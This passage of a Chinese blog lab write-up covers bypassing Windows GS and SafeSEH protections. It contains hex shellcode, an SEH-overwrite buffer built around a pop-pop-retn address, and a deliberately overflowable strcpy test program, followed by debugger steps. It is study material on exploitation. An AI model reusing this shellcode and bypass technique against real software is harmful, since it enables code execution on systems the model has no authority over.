class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x68\x10\x12\x11"</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xE9\x1F\xFF\xFF\xFF"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyException</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"There is an exception"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str, input);</span><br><span class="line">	<span class="keyword">int</span> zero = <span class="number">0</span>;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		zero = <span class="number">1</span> / zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (MyException())</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE hInst = LoadLibrary(_T(<span class="string">"SEH_NOSafeSEH_JUMP.dll"</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	test(shellcode);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实验代码解释</p>
+<ul>
+<li><ol>
+<li>第一段代码是DLL使用vc6.0编译，同时设置基地址未0x11120000。工程–》设置–》切换到连接选项卡–》输入框中添加/base:”0x11120000”</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>第二段代码对应调用的DLL，存在漏洞的代码。启用GS,启用SafeSEH,禁用优化，禁用DEP。test函数中明显存在一个栈溢出漏洞，最后利用除零来触发异常。但是我实际按照书上的代码操作的时候，因为shellcode太长，复制的时候向0x00130000进行复制，先触发了访问异常。所以和书上的情况有些不同，进行了适当的调整，将shellcode反正了前面。</li>
+</ol>
+</li>
+</ul>
+<p>实验过程</p>
+<ul>
+<li>1.用OD加载SHE_NOSafe.exe并运行</li>
+<li>2.利用OllySSEH插件（百度云中也放了）进行扫描，查看程序和DLL是否使用了SafeSEH。/SafeSEH OFF表示未启用SafeSEH，这种就可以做为跳板。/SafeSEH ON启用了SafeSEH，右键可以查看SEH表的注册情况。No SEH不支持SafeSEH，即IMAGE_DLLCHARACTERISTICS_NO_SEH标志位被设置，模块内的异常会被忽略，不能做为跳板。Error 读取错误。如下图所示。</li>
+<li>3.查找SEH_NoSafeSEH_JUMP.dll中pop pop retn的地址。可以使用OllyFindAddr插件–》OverFlow return address–》Find POP RETN–》Count of pop填2。可以查找全范围内的所有pop pop retn的地址，这里使用0x11121068做为我们的跳板</li>
+</ul>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/SafeSEHScan.png" alt="SafeSEHSacn"></p>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/poppopretn.png" alt="poppopretn"></p>
+<ul>
+<li>4.确定Shellcode位置。因为0x00130000地址不能读写，只能将shellcode安排在前面。再用跳转指令回到shellcode。shellcode布局：[32个字节0x90][168个字节shellcode][16字节0x90][4字节 pop pop retn地址][5字节jmp指令][168字节填充]。具体流程如下所示。在触发异常后，利用没有启用SafeSEH的模块中的pop pop retn指令使EIP指向SEH_handler+4的地址，再用jmp指令跳转到shellcode之前，成功执行shellcode。</li>
+</ul>
+<p><img src="/2019/05/15/绕过GS和SafeSEH保护/SafeSEH绕过流程图.png" alt="SafeSEH绕过流程图"></p>
+<h2 id="利用加载模块之外的地址绕过SafeSEH"><a href="#利用加载模块之外的地址绕过SafeSEH" class="headerlink" title="利用加载模块之外的地址绕过SafeSEH"></a>利用加载模块之外的地址绕过SafeSEH</h2><p>类似前面利用没有启用SafeSEH的模块来绕过，利用插件ollyFindAddr可以来找到可以利用地址。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次实验的大部分问题出在了编译程序上，还有就是没注意到书上GS的实验都是在windows2000上进行的，在windows xp sp3上并不能成功的绕过。在绕过GS和SafeSEH的时候遇到可用空间不住，可以用jmp指令来跳转到前面或后面空间中进行利用。</p>
+</div></article></div></main><footer><div class="paginator"><a href="/2019/04/24/利用SEH的栈溢出/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 <a href="https://bigkan.github.io">杂毛小鸡</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
